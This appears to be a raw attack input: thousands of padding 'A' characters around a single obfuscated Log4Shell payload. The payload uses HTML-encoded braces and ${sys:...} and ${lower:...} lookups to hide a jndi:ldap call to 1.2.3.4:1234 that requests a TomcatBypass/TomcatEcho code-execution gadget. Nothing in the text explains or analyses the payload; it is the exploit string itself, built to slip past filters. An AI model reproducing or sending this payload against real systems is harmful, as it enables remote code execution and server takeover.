AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$&#123;$&#123;sys:sun.cpu.isalist&#125;j$&#123;sys:sun.cpu.isalist&#125;n$&#123;sys:sun.cpu.isalist&#125;d$&#123;sys:sun.cpu.isalist&#125;i$&#123;sys:sun.cpu.isalist&#125;$&#123;sys:path.separator&#125;$&#123;lower:LDAP&#125;$&#123;sys:path.separator&#125;$&#123;sys:file.separator&#125;$&#123;sys:file.separator&#125;1$&#123;sys:sun.cpu.isalist&#125;.2$&#123;sys:sun.cpu.isalist&#125;.3$&#123;sys:sun.cpu.isalist&#125;.4$&#123;sys:sun.cpu.isalist&#125;$&#123;sys:path.separator&#125;1234$&#123;sys:file.separator&#125;TomcatBypass$&#123;sys:file.separator&#125;TomcatEcho&#125;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA